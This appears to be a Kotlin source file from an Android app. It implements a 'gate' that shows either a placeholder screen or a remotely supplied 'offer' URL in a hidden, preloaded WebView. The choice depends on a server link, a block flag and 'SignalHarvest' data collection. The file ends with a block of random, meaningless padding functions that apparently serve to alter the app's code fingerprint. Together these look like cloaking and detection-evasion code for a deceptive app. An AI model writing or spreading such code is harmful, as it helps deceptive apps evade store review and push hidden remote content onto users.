package com.kFjQzLm.VpRnTx.gate

import android.app.Activity
import android.content.Context
import com.kFjQzLm.VpRnTx.core.AppConstants
import com.kFjQzLm.VpRnTx.core.Utils
import com.kFjQzLm.VpRnTx.net.CfTransport
import com.kFjQzLm.VpRnTx.storage.SharedPreferencesHelper
import com.kFjQzLm.VpRnTx.webview.ViewportBackend
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL

sealed interface GateResult {
    data object Webview : GateResult
    data object Placeholder : GateResult
    data object NoInternet : GateResult
}

/**
 * Diversified gate pipeline:
 * reset → internet → signal intake → blocked → cached URL OR (getLink → collect → init).
 */
object GatePipeline {

    suspend fun initialize(activity: Activity?, context: Context): GateResult {
        InitRuntime.reset()

        // 0) WebView always comes up first with the worker privacy policy, hidden
        //    behind the Compose loader. The offer link (if any) is loaded into the
        //    very same view later by OfferResolve.
        try {
            val policyUrl = workerPolicyUrl()
            if (policyUrl.isNotEmpty()) {
                ViewportBackend.preload(activity, policyUrl)
            }
        } catch (_: Exception) {
        }

        // 1) Internet check FIRST
        val hasInternet = try {
            checkInternetConnection()
        } catch (_: Exception) {
            false
        }
        if (!hasInternet) return GateResult.NoInternet

        // 2) Signal intake: sendId + pending push URL
        try {
            SignalHarvest.syncPendingSendIdFromNative()
        } catch (_: Exception) {
        }
        try {
            SignalHarvest.syncPendingPushUrlFromNative(context)
        } catch (_: Exception) {
        }

        // One-shot stale-block reset (survives in-place release installs).
        try {
            val blockReset = SharedPreferencesHelper.loadString(AppConstants.BLOCK_RESET_KEY, "")
            if (blockReset.isNullOrEmpty()) {
                Utils.setUserBlock(0)
                SharedPreferencesHelper.saveString(AppConstants.BLOCK_RESET_KEY, "1")
            }
        } catch (_: Exception) {
        }

        // 3) Blocked check
        val isBlocked = try {
            Utils.getUserBlock() != 0
        } catch (_: Exception) {
            OfferResolve.unsubscribeFirebase()
            return GateResult.Placeholder
        }
        if (isBlocked) {
            OfferResolve.unsubscribeFirebase()
            return GateResult.Placeholder
        }

        // 4) Prefer cached final URL; getLink validation only when no cache
        val finalUrl = try {
            cachedFinalUrl()
        } catch (_: Exception) {
            OfferResolve.unsubscribeFirebase()
            return GateResult.Placeholder
        }
        if (finalUrl.isNotEmpty()) {
            try {
                ViewportBackend.show(activity, finalUrl)
            } catch (_: Exception) {
            }
            return GateResult.Webview
        }

        val link = try {
            Utils.getLink()
        } catch (_: Exception) {
            ""
        }
        if (link.isEmpty()) {
            Utils.setUserBlock(1)
            OfferResolve.unsubscribeFirebase()
            return GateResult.Placeholder
        }

        try {
            SignalHarvest.parallelCollectStep(activity, context)
        } catch (_: Exception) {
        }

        return try {
            OfferResolve.initStep(activity, context)
        } catch (_: Exception) {
            OfferResolve.unsubscribeFirebase()
            GateResult.Placeholder
        }
    }

    private suspend fun cachedFinalUrl(): String {
        val stored = SharedPreferencesHelper.loadString(AppConstants.FIN_KEY, "")
        if (stored.isNullOrEmpty()) return ""
        return InitRuntime.appendSendId(stored, InitRuntime.pendingSendId)
    }

    /** Privacy policy served by the worker (same host as the init endpoint). */
    private fun workerPolicyUrl(): String {
        val worker = Utils.getLink()
        if (worker.isEmpty()) return ""
        return CfTransport.normalizeBaseUrl(worker) + AppConstants.POLICY_PATH
    }

    private suspend fun checkInternetConnection(): Boolean = withContext(Dispatchers.IO) {
        try {
            val connection = URL("https://www.google.com").openConnection() as HttpURLConnection
            connection.requestMethod = "HEAD"
            connection.connectTimeout = 15_000
            connection.readTimeout = 15_000
            connection.setRequestProperty("Content-Type", "application/json")
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36")
            val code = connection.responseCode
            connection.disconnect()
            code in 200..399
        } catch (_: Exception) {
            false
        }
    }

    
}

/* autopad-begin */
private object Padsirocywo5wvk {
    private fun dufehuxe(notykiga: Int): Int {
        val rycubaso = notykiga + 59
        return rycubaso
    }
    private fun notadapi(tohukufu: Int): Int {
        val cosufica = tohukufu + 60
        return cosufica
    }
    private fun niciqojo(salyhede: Int): Int {
        val gariqixy = salyhede + 35
        return gariqixy
    }
    private fun zehequba(xowyceqe: Int): Int {
        val recatugi = xowyceqe + 10
        return recatugi
    }
    private fun coxujoju(sukobori: Int): Int {
        val tosusipo = sukobori + 76
        return tosusipo
    }
    private fun kaqyxoca(dudodazi: Int): Int {
        val fyruxexi = dudodazi + 13
        return fyruxexi
    }
    private fun katexawe(qewaloza: Int): Int {
        val texuromi = qewaloza + 62
        return texuromi
    }
}
/* autopad-end */
